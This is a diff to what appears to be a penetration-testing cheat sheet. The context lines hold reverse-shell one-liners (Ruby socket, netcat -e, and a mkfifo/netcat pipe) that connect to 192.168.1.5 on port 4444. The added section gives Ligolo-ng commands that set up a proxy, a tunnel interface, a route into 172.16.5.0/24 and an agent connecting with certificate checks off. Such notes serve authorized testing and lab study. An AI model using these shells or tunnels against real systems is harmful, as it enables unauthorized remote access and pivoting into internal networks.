@@ -6191,3 +6191,18 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.1.5","4444");while(cmd=c
 nc -e /bin/bash 192.168.1.5 4444
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.5 4444 >/tmp/f
 ```
+
+### Ligolo-ng
+
+```
+#1
+sudo ./proxy  -selfcert  -laddr 0.0.0.0:443 
+#2
+interface_create --name "ligolo"
+#4
+sudo ip route add 172.16.5.0/24  dev ligolo || interface_add_route --name ligolo --route  172.16.5.0/24
+#5
+session -> start
+#3
+./agent -connect 10.10.16.5:443 -ignore-cert
+```
